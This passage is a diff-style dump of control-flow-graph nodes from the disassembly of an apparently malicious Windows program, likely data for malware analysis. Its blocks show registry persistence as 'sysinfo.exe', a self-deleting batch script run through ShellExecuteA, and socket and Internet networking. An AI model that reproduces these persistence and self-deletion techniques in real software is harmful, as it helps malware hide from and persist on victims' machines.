+  4204883, ['jl', 'shortloc_40295E']
+ next: [4204885, 4204894]
+
+node :357
+node sub_4016CF(4200328) info:
+ start: 4200328
+ prev: []
+ instructions: 
+  4200328, ['push', 'ebx;hObject']
+  4200329, ['call', 'CloseHandle']
+ next: [4200334]
+
+node :358
+node sub_401063(4198499) info:
+ start: 4198499
+ prev: []
+ instructions: 
+  4198499, ['push', 'ebp']
+  4198500, ['mov', 'ebp,esp']
+  4198502, ['add', 'esp,0FFFFFFFCh']
+  4198505, ['push', 'ebx']
+  4198506, ['push', '[ebp+lpString];lpString']
+  4198509, ['call', 'lstrlenA']
+  4198514, ['mov', 'ebx,eax']
+  4198516, ['push', '[ebp+lpString2];lpString']
+  4198519, ['call', 'lstrlenA']
+  4198524, ['add', 'ebx,eax']
+  4198526, ['add', 'ebx,10h']
+  4198529, ['push', 'ebx;dwBytes']
+  4198530, ['push', '40h;uFlags']
+  4198532, ['call', 'GlobalAlloc']
+  4198537, ['mov', '[ebp+lpString1],eax']
+  4198540, ['push', '[ebp+arg_4]']
+  4198543, ['push', '[ebp+lpString]']
+  4198546, ['call', 'StrStrIA']
+  4198551, ['or', 'eax,eax']
+  4198553, ['jz', 'shortloc_4010CE']
+ next: [4198555, 4198606]
+
+node :359
+node sub_402D47(4205999) info:
+ start: 4205999
+ prev: []
+ instructions: 
+  4205999, ['push', 'ebx;hInternet']
+  4206000, ['call', 'InternetCloseHandle']
+ next: [4206005]
+
+node :360
+node sub_402E35(4206376) info:
+ start: 4206376
+ prev: []
+ instructions: 
+  4206376, ['jmp', 'loc_4030E4']
+ next: [4206820]
+
+node :361
+node sub_401000(4198428) info:
+ start: 4198428
+ prev: []
+ instructions: 
+  4198428, ['rep', 'stosb']
+ next: [4198430]
+
+node :362
+node sub_401184(4198927) info:
+ start: 4198927
+ prev: []
+ instructions: 
+  4198927, ['push', 'offsetBuffer;":l\\r\\ndel%1\\r\\nifexist%1gotol\\r\\nd"...']
+  4198932, ['call', 'lstrlenA']
+  4198937, ['xchg', 'eax,edx']
+  4198938, ['push', '0;lpOverlapped']
+  4198940, ['lea', 'eax,[ebp+NumberOfBytesWritten]']
+  4198943, ['push', 'eax;lpNumberOfBytesWritten']
+  4198944, ['push', 'edx;nNumberOfBytesToWrite']
+  4198945, ['push', 'offsetBuffer;":l\\r\\ndel%1\\r\\nifexist%1gotol\\r\\nd"...']
+  4198950, ['push', '[ebp+hFile];hFile']
+  4198953, ['call', 'WriteFile']
+  4198958, ['push', '[ebp+hFile];hObject']
+  4198961, ['call', 'CloseHandle']
+  4198966, ['jmp', 'shortloc_401242']
+ next: [4198978]
+
+node :363
+node sub_402E35(4206281) info:
+ start: 4206281
+ prev: []
+ instructions: 
+  4206281, ['jmp', 'loc_4030E4']
+ next: [4206820]
+
+node :364
+node sub_402964(4204900) info:
+ start: 4204900
+ prev: []
+ instructions: 
+  4204900, ['push', 'ebp']
+  4204901, ['mov', 'ebp,esp']
+  4204903, ['push', '2Eh']
+  4204905, ['push', '0']
+  4204907, ['push', '[ebp+arg_0]']
+  4204910, ['call', 'StrRChrA']
+  4204915, ['or', 'eax,eax']
+  4204917, ['jz', 'shortlocret_40298B']
+ next: [4204919, 4204939]
+
+node :365
+node sub_4014F8(4199714) info:
+ start: 4199714
+ prev: []
+ instructions: 
+  4199714, ['mov', 'eax,edx']
+  4199716, ['pop', 'ebx']
+  4199717, ['leave']
+  4199718, ['retn', '4']
+ next: []
+
+node :366
+node sub_402105(4202812) info:
+ start: 4202812
+ prev: []
+ instructions: 
+  4202812, ['leave']
+  4202813, ['retn', '4']
+ next: []
+
+node :367
+node connect(4207364) info:
+ start: 4207364
+ prev: []
+ instructions: 
+  4207364, ['jmp', '__imp_connect']
+ next: []
+
+node :368
+node sub_4019D4(4201009) info:
+ start: 4201009
+ prev: []
+ instructions: 
+  4201009, ['xor', 'eax,eax']
+  4201011, ['test', 'ebx,ebx']
+  4201013, ['setz', 'al']
+  4201016, ['pop', 'ebx']
+  4201017, ['leave']
+  4201018, ['retn', '14h']
+ next: []
+
+node :369
+node sub_40183A(4200738) info:
+ start: 4200738
+ prev: []
+ instructions: 
+  4200738, ['jmp', 'shortlocret_40193C']
+ next: [4200764]
+
+node :370
+node sub_402B99(4205520) info:
+ start: 4205520
+ prev: []
+ instructions: 
+  4205520, ['pop', 'edi']
+  4205521, ['leave']
+  4205522, ['retn', '4']
+ next: []
+
+node :371
+node sub_402140(4202956) info:
+ start: 4202956
+ prev: []
+ instructions: 
+  4202956, ['pop', 'ebx']
+  4202957, ['leave']
+  4202958, ['retn', '8']
+ next: []
+
+node :372
+node sub_402782(4204558) info:
+ start: 4204558
+ prev: []
+ instructions: 
+  4204558, ['xor', 'eax,eax']
+  4204560, ['pop', 'edi']
+  4204561, ['pop', 'ebx']
+  4204562, ['leave']
+  4204563, ['retn', '4']
+ next: []
+
+node :373
+node sub_40183A(4200731) info:
+ start: 4200731
+ prev: []
+ instructions: 
+  4200731, ['push', '0;uExitCode']
+  4200733, ['call', 'ExitProcess']
+ next: []
+
+node :374
+node GetTimeFormatA(4207220) info:
+ start: 4207220
+ prev: []
+ instructions: 
+  4207220, ['jmp', '__imp_GetTimeFormatA']
+ next: []
+
+node :375
+node sub_401543(4199824) info:
+ start: 4199824
+ prev: []
+ instructions: 
+  4199824, ['push', 'edx']
+  4199825, ['push', '8;dwBytes']
+  4199827, ['push', '40h;uFlags']
+  4199829, ['call', 'GlobalAlloc']
+  4199834, ['pop', 'edx']
+  4199835, ['mov', '[edx+4],eax']
+  4199838, ['push', '[ebp+arg_8]']
+  4199841, ['pop', 'dwordptr[eax]']
+  4199843, ['xor', 'eax,eax']
+  4199845, ['inc', 'eax']
+ next: [4199846]
+
+node :376
+node lstrcatA(4207310) info:
+ start: 4207310
+ prev: []
+ instructions: 
+  4207310, ['jmp', '__imp_lstrcatA']
+ next: []
+
+node :377
+node CompareFileTime(4207106) info:
+ start: 4207106
+ prev: []
+ instructions: 
+  4207106, ['jmp', '__imp_CompareFileTime']
+ next: []
+
+node :378
+node accept(4207346) info:
+ start: 4207346
+ prev: []
+ instructions: 
+  4207346, ['jmp', '__imp_accept']
+ next: []
+
+node :379
+node sub_401543(4199775) info:
+ start: 4199775
+ prev: []
+ instructions: 
+  4199775, ['push', 'eax']
+  4199776, ['push', '8;dwBytes']
+  4199778, ['push', '40h;uFlags']
+  4199780, ['call', 'GlobalAlloc']
+  4199785, ['pop', 'edx']
+  4199786, ['mov', '[edx],eax']
+  4199788, ['push', '[ebp+arg_8]']
+  4199791, ['pop', 'dwordptr[eax]']
+  4199793, ['xor', 'eax,eax']
+  4199795, ['inc', 'eax']
+  4199796, ['jmp', 'shortlocret_4015A6']
+ next: [4199846]
+
+node :380
+node sub_401184(4198978) info:
+ start: 4198978
+ prev: []
+ instructions: 
+  4198978, ['push', '[ebp+lpFilename]']
+  4198981, ['push', 'offsetaS;"\\"%s\\""']
+  4198986, ['push', '[ebp+var_14];LPSTR']
+  4198989, ['call', 'wsprintfA']
+  4198994, ['add', 'esp,0Ch']
+  4198997, ['xor', 'eax,eax']
+  4198999, ['push', '0;nShowCmd']
+  4199001, ['push', 'eax;lpDirectory']
+  4199002, ['push', '[ebp+var_14];lpParameters']
+  4199005, ['push', '[ebp+lpString1];lpFile']
+  4199008, ['push', 'offsetOperation;"open"']
+  4199013, ['push', 'eax;hwnd']
+  4199014, ['call', 'ShellExecuteA']
+ next: [4199019]
+
+node :381
+node recv(4207394) info:
+ start: 4207394
+ prev: []
+ instructions: 
+  4207394, ['jmp', '__imp_recv']
+ next: []
+
+node :382
+node sub_401E1F(4202276) info:
+ start: 4202276
+ prev: []
+ instructions: 
+  4202276, ['push', 'ebx;s']
+  4202277, ['call', 'closesocket']
+ next: [4202282]
+
+node :383
+node sub_4010DD(4198730) info:
+ start: 4198730
+ prev: []
+ instructions: 
+  4198730, ['mov', 'ecx,ebx']
+  4198732, ['sub', 'edi,ecx']
+  4198734, ['mov', 'al,3Dh']
+  4198736, ['rep', 'stosb']
+  4198738, ['pop', 'ebx']
+  4198739, ['pop', 'edi']
+  4198740, ['pop', 'esi']
+  4198741, ['leave']
+  4198742, ['retn', '0Ch']
+ next: []
+
+node :384
+node sub_402E35(4206820) info:
+ start: 4206820
+ prev: []
+ instructions: 
+  4206820, ['push', '[ebp+s];s']
+  4206823, ['call', 'closesocket']
+  4206828, ['push', 'hHandle;hMutex']
+  4206834, ['call', 'ReleaseMutex']
+  4206839, ['xor', 'eax,eax']
+  4206841, ['pop', 'ebx']
+  4206842, ['pop', 'edi']
+  4206843, ['pop', 'esi']
+  4206844, ['leave']
+  4206845, ['retn', '8']
+ next: []
+
+node :385
+node sub_402A64(4205268) info:
+ start: 4205268
+ prev: []
+ instructions: 
+  4205268, ['push', 'ebx;hObject']
+  4205269, ['call', 'CloseHandle']
+ next: [4205274]
+
+node :386
+node sub_402947(4204885) info:
+ start: 4204885
+ prev: []
+ instructions: 
+  4204885, ['mov', 'eax,1']
+  4204890, ['leave']
+  4204891, ['retn', '8']
+ next: []
+
+node :387
+node sub_4017E1(4200488) info:
+ start: 4200488
+ prev: []
+ instructions: 
+  4200488, ['mov', 'ebx,0']
+ next: [4200493]
+
+node :388
+node sub_401529(4199721) info:
+ start: 4199721
+ prev: []
+ instructions: 
+  4199721, ['push', 'ebp']
+  4199722, ['mov', 'ebp,esp']
+  4199724, ['mov', 'eax,[ebp+arg_4]']
+  4199727, ['shl', 'eax,2']
+  4199730, ['push', 'eax;dwBytes']
+  4199731, ['push', '40h;uFlags']
+  4199733, ['call', 'GlobalAlloc']
+  4199738, ['mov', 'ecx,[ebp+arg_0]']
+  4199741, ['mov', '[ecx],eax']
+  4199743, ['leave']
+  4199744, ['retn', '8']
+ next: []
+
+node :389
+node lstrlenA(4207328) info:
+ start: 4207328
+ prev: []
+ instructions: 
+  4207328, ['jmp', '__imp_lstrlenA']
+ next: []
+
+node :390
+node sub_401D31(4201929) info:
+ start: 4201929
+ prev: []
+ instructions: 
+  4201929, ['mov', 'edx,[ebp+arg_0]']
+  4201932, ['mov', 'edx,[edx]']
+  4201934, ['push', '0']
+  4201936, ['push', '1']
+  4201938, ['lea', 'eax,[ebp+var_10]']
+  4201941, ['push', 'eax']
+  4201942, ['push', '[ebp+arg_0]']
+  4201945, ['call', 'dwordptr[edx+10h]']
+  4201948, ['mov', '[ebp+var_12],0Fh']
+  4201954, ['ror', '[ebp+var_12],8']
+  4201959, ['mov', 'edx,[ebp+arg_0]']
+  4201962, ['mov', 'edx,[edx]']
+  4201964, ['push', '0']
+  4201966, ['push', '2']
+  4201968, ['lea', 'eax,[ebp+var_12]']
+  4201971, ['push', 'eax']
+  4201972, ['push', '[ebp+arg_0]']
+  4201975, ['call', 'dwordptr[edx+10h]']
+  4201978, ['mov', '[ebp+var_12],1']
+  4201984, ['ror', '[ebp+var_12],8']
+  4201989, ['mov', 'edx,[ebp+arg_0]']
+  4201992, ['mov', 'edx,[edx]']
+  4201994, ['push', '0']
+  4201996, ['push', '2']
+  4201998, ['lea', 'eax,[ebp+var_12]']
+  4202001, ['push', 'eax']
+  4202002, ['push', '[ebp+arg_0]']
+  4202005, ['call', 'dwordptr[edx+10h]']
+  4202008, ['pop', 'ebx']
+  4202009, ['pop', 'edi']
+  4202010, ['pop', 'esi']
+  4202011, ['leave']
+  4202012, ['retn', '8']
+ next: []
+
+node :391
+node sub_402B00(4205356) info:
+ start: 4205356
+ prev: []
+ instructions: 
+  4205356, ['mov', 'eax,1']
+  4205361, ['pop', 'edi']
+  4205362, ['leave']
+  4205363, ['retn', '4']
+ next: []
+
+node :392
+node sub_401063(4198606) info:
+ start: 4198606
+ prev: []
+ instructions: 
+  4198606, ['push', '[ebp+lpString1];hMem']
+  4198609, ['call', 'GlobalFree']
+  4198614, ['xor', 'eax,eax']
+ next: [4198616]
+
+node :393
+node sub_40183A(4200759) info:
+ start: 4200759
+ prev: []
+ instructions: 
+  4200759, ['call', 'sub_4017A0']
+ next: [4200764]
+
+node :394
+node sub_401000(4198430) info:
+ start: 4198430
+ prev: []
+ instructions: 
+  4198430, ['pop', 'edi']
+  4198431, ['leave']
+  4198432, ['retn', '8']
+ next: []
+
+node :395
+node WaitForSingleObject(4207292) info:
+ start: 4207292
+ prev: []
+ instructions: 
+  4207292, ['jmp', '__imp_WaitForSingleObject']
+ next: []
+
+node :396
+node sub_402964(4204919) info:
+ start: 4204919
+ prev: []
+ instructions: 
+  4204919, ['push', 'eax;lpString']
+  4204920, ['call', 'lstrlenA']
+  4204925, ['cmp', 'eax,2']
+  4204928, ['ja', 'shortloc_402986']
+ next: [4204930, 4204934]
+
+node :397
+node FindClose(4207148) info:
+ start: 4207148
+ prev: []
+ instructions: 
+  4207148, ['jmp', '__imp_FindClose']
+ next: []
+
+node :398
+node GetCommandLineA(4207166) info:
+ start: 4207166
+ prev: []
+ instructions: 
+  4207166, ['jmp', '__imp_GetCommandLineA']
+ next: []
+
+node :399
+node InternetCloseHandle(4207454) info:
+ start: 4207454
+ prev: []
+ instructions: 
+  4207454, ['jmp', '__imp_InternetCloseHandle']
+ next: []
+
+node :400
+node sub_401274(4199082) info:
+ start: 4199082
+ prev: []
+ instructions: 
+  4199082, ['pop', 'edi']
+  4199083, ['leave']
+  4199084, ['retn', '4']
+ next: []
+
+node :401
+node sub_401F31(4202366) info:
+ start: 4202366
+ prev: []
+ instructions: 
+  4202366, ['mov', 'eax,esi']
+  4202368, ['pop', 'edi']
+  4202369, ['pop', 'esi']
+  4202370, ['leave']
+  4202371, ['retn', '0Ch']
+ next: []
+
+node :402
+node sub_4024A9(4203689) info:
+ start: 4203689
+ prev: []
+ instructions: 
+  4203689, ['push', 'ebp']
+  4203690, ['mov', 'ebp,esp']
+  4203692, ['push', 'ebx']
+  4203693, ['push', 'esi']
+  4203694, ['push', 'edi']
+  4203695, ['mov', 'esi,[ebp+lpString]']
+  4203698, ['push', 'esi;lpString']
+  4203699, ['call', 'lstrlenA']
+  4203704, ['push', 'eax']
+  4203705, ['mov', 'edi,[ebp+arg_C]']
+  4203708, ['push', '10h;dwBytes']
+  4203710, ['push', '40h;uFlags']
+  4203712, ['call', 'GlobalAlloc']
+  4203717, ['mov', 'ebx,eax']
+  4203719, ['mov', 'edx,[ebp+arg_0]']
+  4203722, ['mov', 'ecx,[ebp+arg_4]']
+  4203725, ['cmp', 'dwordptr[edx],0']
+  4203728, ['jnz', 'shortloc_4024D6']
+ next: [4203730, 4203734]
+
+node :403
+node sub_402D47(4206005) info:
+ start: 4206005
+ prev: []
+ instructions: 
+  4206005, ['push', '[ebp+hInternet];hInternet']
+  4206008, ['call', 'InternetCloseHandle']
+  4206013, ['push', '[ebp+var_8];hMem']
+  4206016, ['call', 'GlobalFree']
+  4206021, ['xchg', 'eax,ebx']
+  4206022, ['pop', 'esi']
+  4206023, ['pop', 'ebx']
+  4206024, ['leave']
+  4206025, ['retn', '4']
+ next: []
+
+node :404
+node sub_402741(4204415) info:
+ start: 4204415
+ prev: []
+ instructions: 
+  4204415, ['pop', 'ebx']
+  4204416, ['pop', 'edi']
+  4204417, ['retn']
+ next: []
+
+node :405
+node sub_4028AF(4204788) info:
+ start: 4204788
+ prev: []
+ instructions: 
+  4204788, ['cld']
+  4204789, ['mov', 'eax,ebx']
+  4204791, ['pop', 'ebx']
+  4204792, ['pop', 'esi']
+  4204793, ['leave']
+  4204794, ['retn', '4']
+ next: []
+
+node :406
+node sub_401AA0(4201229) info:
+ start: 4201229
+ prev: []
+ instructions: 
+  4201229, ['mov', 'eax,1']
+  4201234, ['leave']
+  4201235, ['retn', '10h']
+ next: []
+
+node :407
+node sub_401977(4200906) info:
+ start: 4200906
+ prev: []
+ instructions: 
+  4200906, ['xor', 'eax,eax']
+  4200908, ['jmp', 'shortlocret_4019D0']
+ next: [4200912]
+
+node :408
+node sub_401FB9(4202540) info:
+ start: 4202540
+ prev: []
+ instructions: 
+  4202540, ['jmp', 'shortloc_4020A1']
+ next: [4202657]
+
+node :409
+node sub_401FB9(4202571) info:
+ start: 4202571
+ prev: []
+ instructions: 
+  4202571, ['jmp', 'shortloc_4020A1']
+ next: [4202657]
+
+node :410
+node sub_402506(4203906) info:
+ start: 4203906
+ prev: []
+ instructions: 
+  4203906, ['push', 'edx']
+  4203907, ['push', 'eax']
+  4203908, ['push', 'offseta03i02i;"%03i%02i"']
+  4203913, ['lea', 'eax,[ebp+DateStr]']
+  4203916, ['push', 'eax;LPSTR']
+  4203917, ['call', 'wsprintfA']
+  4203922, ['add', 'esp,10h']
+  4203925, ['cmp', '[ebp+DateStr],30h']
+  4203929, ['jnz', 'shortloc_40259F']
+ next: [4203931, 4203935]
+
+node :411
+node sub_402B36(4205448) info:
+ start: 4205448
+ prev: []
+ instructions: 
+  4205448, ['push', '[ebp+lpString2];lpString2']
+  4205451, ['push', 'offsetbyte_407D72;lpString1']
+  4205456, ['call', 'lstrcpyA']
+ next: [4205461]
+
+node :412
+node sub_401B2A(4201373) info:
+ start: 4201373
+ prev: []
+ instructions: 
+  4201373, ['push', 'ebx;s']
+  4201374, ['call', 'closesocket']
+  4201379, ['xor', 'ebx,ebx']
+ next: [4201381]
+
+node :413
+node sub_4012AF(4199294) info:
+ start: 4199294
+ prev: []
+ instructions: 
+  4199294, ['xor', 'eax,9908B0DFh']
+ next: [4199299]
+
+node :414
+node sub_401977(4200910) info:
+ start: 4200910
+ prev: []
+ instructions: 
+  4200910, ['mov', 'al,1']
+ next: [4200912]
+
+node :415
+node sub_4016CF(4200334) info:
+ start: 4200334
+ prev: []
+ instructions: 
+  4200334, ['push', '[ebp+hFile];hObject']
+  4200337, ['call', 'CloseHandle']
+ next: [4200342]
+
+node :416
+node sub_402B00(4205344) info:
+ start: 4205344
+ prev: []
+ instructions: 
+  4205344, ['xor', 'eax,eax']
+  4205346, ['pop', 'edi']
+  4205347, ['leave']
+  4205348, ['retn', '4']
+ next: []
+
+node :417
+node ExitProcess(4207142) info:
+ start: 4207142
+ prev: []
+ instructions: 
+  4207142, ['jmp', '__imp_ExitProcess']
+ next: []
+
+node :418
+node sub_4024A9(4203730) info:
+ start: 4203730
+ prev: []
+ instructions: 
+  4203730, ['mov', '[edx],ebx']
+  4203732, ['jmp', 'shortloc_4024DD']
+ next: [4203741]
+
+node :419
+node sub_40298F(4205149) info:
+ start: 4205149
+ prev: []
+ instructions: 
+  4205149, ['pop', 'ebx']
+  4205150, ['pop', 'edi']
+  4205151, ['pop', 'esi']
+  4205152, ['leave']
+  4205153, ['retn', '0Ch']
+ next: []
+
+node :420
+node sub_401184(4198881) info:
+ start: 4198881
+ prev: []
+ instructions: 
+  4198881, ['jmp', 'loc_40126B']
+ next: [4199019]
+
+node :421
+node FindFirstFileA(4207154) info:
+ start: 4207154
+ prev: []
+ instructions: 
+  4207154, ['jmp', '__imp_FindFirstFileA']
+ next: []
+
+node :422
+node sub_4016CF(4200342) info:
+ start: 4200342
+ prev: []
+ instructions: 
+  4200342, ['push', '[ebp+lpFilename];hMem']
+  4200345, ['call', 'GlobalFree']
+  4200350, ['leave']
+  4200351, ['retn']
+ next: []
+
+node :423
+node sub_401B2A(4201381) info:
+ start: 4201381
+ prev: []
+ instructions: 
+  4201381, ['mov', 'eax,ebx']
+  4201383, ['pop', 'ebx']
+  4201384, ['leave']
+  4201385, ['retn', '0Ch']
+ next: []
+
+node :424
+node sub_4028FD(4204863) info:
+ start: 4204863
+ prev: []
+ instructions: 
+  4204863, ['mov', 'eax,ebx']
+  4204865, ['pop', 'ebx']
+  4204866, ['pop', 'esi']
+  4204867, ['leave']
+  4204868, ['retn', '4']
+ next: []
+
+node :425
+node CloseHandle(4207100) info:
+ start: 4207100
+ prev: []
+ instructions: 
+  4207100, ['jmp', '__imp_CloseHandle']
+ next: []
+
+node :426
+node sub_401FB9(4202657) info:
+ start: 4202657
+ prev: []
+ instructions: 
+  4202657, ['push', '[ebp+hMem];hMem']
+  4202660, ['call', 'GlobalFree']
+  4202665, ['push', '[ebp+lpString2];hMem']
+  4202668, ['call', 'GlobalFree']
+  4202673, ['mov', 'eax,[ebp+lpString1]']
+  4202676, ['pop', 'ebx']
+  4202677, ['pop', 'edi']
+  4202678, ['pop', 'esi']
+  4202679, ['leave']
+  4202680, ['retn', '4']
+ next: []
+
+node :427
+node sub_40183A(4200764) info:
+ start: 4200764
+ prev: []
+ instructions: 
+  4200764, ['leave']
+  4200765, ['retn']
+ next: []
+
+node :428
+node gethostbyname(4207370) info:
+ start: 4207370
+ prev: []
+ instructions: 
+  4207370, ['jmp', '__imp_gethostbyname']
+ next: []
+
+node :429
+node SystemTimeToFileTime(4207280) info:
+ start: 4207280
+ prev: []
+ instructions: 
+  4207280, ['jmp', '__imp_SystemTimeToFileTime']
+ next: []
+
+node :430
+node sub_401023(4198461) info:
+ start: 4198461
+ prev: []
+ instructions: 
+  4198461, ['pop', 'ebx']
+  4198462, ['pop', 'edi']
+  4198463, ['leave']
+  4198464, ['retn', '8']
+ next: []
+
+node :431
+node sub_40193E(4200794) info:
+ start: 4200794
+ prev: []
+ instructions: 
+  4200794, ['mov', 'eax,0FFFFFFFFh']
+  4200799, ['jmp', 'shortlocret_401973']
+ next: [4200819]
+
+node :432
+node lstrcpyA(4207322) info:
+ start: 4207322
+ prev: []
+ instructions: 
+  4207322, ['jmp', '__imp_lstrcpyA']
+ next: []
+
+node :433
+node sub_4015AA(4199966) info:
+ start: 4199966
+ prev: []
+ instructions: 
+  4199966, ['push', '[ebp+phkResult];hKey']
+  4199969, ['call', 'RegCloseKey']
+  4199974, ['pop', 'edi']
+  4199975, ['pop', 'esi']
+  4199976, ['leave']
+  4199977, ['retn']
+ next: []
+
+node :434
+node sub_401977(4200912) info:
+ start: 4200912
+ prev: []
+ instructions: 
+  4200912, ['leave']
+  4200913, ['retn', '8']
+ next: []
+
+node :435
+node GetFileSize(4207184) info:
+ start: 4207184
+ prev: []
+ instructions: 
+  4207184, ['jmp', '__imp_GetFileSize']
+ next: []
+
+node :436
+node ShellExecuteA(4207508) info:
+ start: 4207508
+ prev: []
+ instructions: 
+  4207508, ['jmp', '__imp_ShellExecuteA']
+ next: []
+
+node :437
+node sub_40246F(4203683) info:
+ start: 4203683
+ prev: []
+ instructions: 
+  4203683, ['pop', 'ebx']
+  4203684, ['pop', 'esi']
+  4203685, ['leave']
+  4203686, ['retn', '8']
+ next: []
+
+node :438
+node sub_402964(4204934) info:
+ start: 4204934
+ prev: []
+ instructions: 
+  4204934, ['mov', 'eax,1']
+ next: [4204939]
+
+node :439
+node sub_401E1F(4202282) info:
+ start: 4202282
+ prev: []
+ instructions: 
+  4202282, ['xor', 'eax,eax']
+  4202284, ['pop', 'ebx']
+  4202285, ['leave']
+  4202286, ['retn', '8']
+ next: []
+
+node :440
+node sub_401CC1(4201767) info:
+ start: 4201767
+ prev: []
+ instructions: 
+  4201767, ['push', '[ebp+pFixedInfo];hMem']
+  4201770, ['call', 'GlobalFree']
+  4201775, ['leave']
+  4201776, ['retn']
+ next: []
+
+node :441
+node sub_402B36(4205461) info:
+ start: 4205461
+ prev: []
+ instructions: 
+  4205461, ['leave']
+  4205462, ['retn', '4']
+ next: []
+
+node :442
+node CreateMutexA(4207130) info:
+ start: 4207130
+ prev: []
+ instructions: 
+  4207130, ['jmp', '__imp_CreateMutexA']
+ next: []
+
+node :443
+node sub_401E1F(4202269) info:
+ start: 4202269
+ prev: []
+ instructions: 
+  4202269, ['mov', 'eax,ebx']
+ next: [4202271]
+
+node :444
+node GetModuleFileNameA(4207202) info:
+ start: 4207202
+ prev: []
+ instructions: 
+  4207202, ['jmp', '__imp_GetModuleFileNameA']
+ next: []
+
+node :445
+node sub_4024A9(4203734) info:
+ start: 4203734
+ prev: []
+ instructions: 
+  4203734, ['push', 'ecx']
+  4203735, ['mov', 'ecx,[ecx]']
+  4203737, ['mov', '[ecx+8],ebx']
+  4203740, ['pop', 'ecx']
+ next: [4203741]
+
+node :446
+node sub_401A3D(4201113) info:
+ start: 4201113
+ prev: []
+ instructions: 
+  4201113, ['mov', 'eax,ebx']
+  4201115, ['pop', 'ebx']
+  4201116, ['leave']
+  4201117, ['retn', '14h']
+ next: []
+
+node :447
+node sub_401063(4198555) info:
+ start: 4198555
+ prev: []
+ instructions: 
+  4198555, ['mov', 'byteptr[eax],0']
+  4198558, ['mov', 'ebx,eax']
+  4198560, ['push', '[ebp+arg_4];lpString']
+  4198563, ['call', 'lstrlenA']
+  4198568, ['add', 'ebx,eax']
+  4198570, ['push', '[ebp+lpString];lpString2']
+  4198573, ['push', '[ebp+lpString1];lpString1']
+  4198576, ['call', 'lstrcpyA']
+  4198581, ['push', '[ebp+lpString2];lpString2']
+  4198584, ['push', '[ebp+lpString1];lpString1']
+  4198587, ['call', 'lstrcatA']
+  4198592, ['push', 'ebx;lpString2']
+  4198593, ['push', '[ebp+lpString1];lpString1']
+  4198596, ['call', 'lstrcatA']
+  4198601, ['mov', 'eax,[ebp+lpString1]']
+  4198604, ['jmp', 'shortloc_4010D8']
+ next: [4198616]
+
+node :448
+node StrRChrA(4207436) info:
+ start: 4207436
+ prev: []
+ instructions: 
+  4207436, ['jmp', '__imp_StrRChrA']
+ next: []
+
+node :449
+node gethostname(4207376) info:
+ start: 4207376
+ prev: []
+ instructions: 
+  4207376, ['jmp', '__imp_gethostname']
+ next: []
+
+node :450
+node sub_401C7D(4201597) info:
+ start: 4201597
+ prev: []
+ instructions: 
+  4201597, ['push', 'ebp']
+  4201598, ['mov', 'ebp,esp']
+  4201600, ['add', 'esp,0FFFFFFF8h']
+  4201603, ['push', '0Ch;dwBytes']
+  4201605, ['push', '0;uFlags']
+  4201607, ['call', 'GlobalAlloc']
+  4201612, ['mov', '[ebp+lpParameter],eax']
+  4201615, ['push', '[ebp+arg_0]']
+  4201618, ['pop', 'dwordptr[eax]']
+  4201620, ['push', '[ebp+arg_4]']
+  4201623, ['pop', 'dwordptr[eax+4]']
+  4201626, ['push', '[ebp+arg_8]']
+  4201629, ['pop', 'dwordptr[eax+8]']
+  4201632, ['lea', 'eax,[ebp+ThreadId]']
+  4201635, ['push', 'eax;lpThreadId']
+  4201636, ['push', '0;dwCreationFlags']
+  4201638, ['push', '[ebp+lpParameter];lpParameter']
+  4201641, ['push', 'offsetStartAddress;lpStartAddress']
+  4201646, ['push', '0;dwStackSize']
+  4201648, ['push', '0;lpThreadAttributes']
+  4201650, ['call', 'CreateThread']
+  4201655, ['push', 'eax;hObject']
+  4201656, ['call', 'CloseHandle']
+  4201661, ['leave']
+  4201662, ['retn', '0Ch']
+ next: []
+
+node :451
+node sub_40193E(4200815) info:
+ start: 4200815
+ prev: []
+ instructions: 
+  4200815, ['mov', 'eax,[eax]']
+  4200817, ['mov', 'eax,[eax]']
+ next: [4200819]
+
+node :452
+node sub_401460(4199520) info:
+ start: 4199520
+ prev: []
+ instructions: 
+  4199520, ['push', 'ebp']
+  4199521, ['mov', 'ebp,esp']
+  4199523, ['push', '2']
+  4199525, ['push', '0']
+  4199527, ['push', '[ebp+arg_0]']
+  4199530, ['call', 'sub_4013FC']
+  4199535, ['leave']
+  4199536, ['retn', '4']
+ next: []
+
+node :453
+node FindNextFileA(4207160) info:
+ start: 4207160
+ prev: []
+ instructions: 
+  4207160, ['jmp', '__imp_FindNextFileA']
+ next: []
+
+node :454
+node CreateStreamOnHGlobal(4207424) info:
+ start: 4207424
+ prev: []
+ instructions: 
+  4207424, ['jmp', '__imp_CreateStreamOnHGlobal']
+ next: []
+
+node :455
+node sub_401159(4198787) info:
+ start: 4198787
+ prev: []
+ instructions: 
+  4198787, ['retn']
+ next: []
+
+node :456
+node sub_40162A(4199978) info:
+ start: 4199978
+ prev: []
+ instructions: 
+  4199978, ['push', 'ebp']
+  4199979, ['mov', 'ebp,esp']
+  4199981, ['add', 'esp,0FFFFFFFCh']
+  4199984, ['lea', 'eax,[ebp+phkResult]']
+  4199987, ['push', 'eax;phkResult']
+  4199988, ['push', 'offsetaSoftwareMicros;"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVe"...']
+  4199993, ['push', '80000001h;hKey']
+  4199998, ['call', 'RegCreateKeyA']
+  4200003, ['push', 'offsetNewFileName;lpString']
+  4200008, ['call', 'lstrlenA']
+  4200013, ['push', 'eax;cbData']
+  4200014, ['push', 'offsetNewFileName;lpData']
+  4200019, ['push', '1;dwType']
+  4200021, ['push', '0;Reserved']
+  4200023, ['push', 'offsetaSysinfo_exe;"sysinfo.exe"']
+  4200028, ['push', '[ebp+phkResult];hKey']
+  4200031, ['call', 'RegSetValueExA']
+  4200036, ['push', '[ebp+phkResult];hKey']
+  4200039, ['call', 'RegCloseKey']
+  4200044, ['leave']
+  4200045, ['retn']
+ next: []
+
+node :457
+node Sleep(4207274) info:
+ start: 4207274
+ prev: []
+ instructions: 
+  4207274, ['jmp', '__imp_Sleep']
+ next: []
+
+node :458
+node WriteFile(4207304) info:
+ start: 4207304
+ prev: []
+ instructions: 
+  4207304, ['jmp', '__imp_WriteFile']
+ next: []
+
+node :459
+node sub_402964(4204930) info:
+ start: 4204930
+ prev: []
+ instructions: 
+  4204930, ['xor', 'eax,eax']
+  4204932, ['jmp', 'shortlocret_40298B']
+ next: [4204939]
+
+node :460
+node sub_402506(4203931) info:
+ start: 4203931
+ prev: []
+ instructions: 
+  4203931, ['mov', '[ebp+DateStr],2Bh']
+ next: [4203935]
+
+node :461
+node sub_402A64(4205274) info:
+ start: 4205274
+ prev: []
+ instructions: 
+  4205274, ['push', '[ebp+hFile];hObject']
+  4205277, ['call', 'CloseHandle']
+ next: [4205282]
+
+node :462
+node sub_40166E(4200138) info:
+ start: 4200138
+ prev: []
+ instructions: 
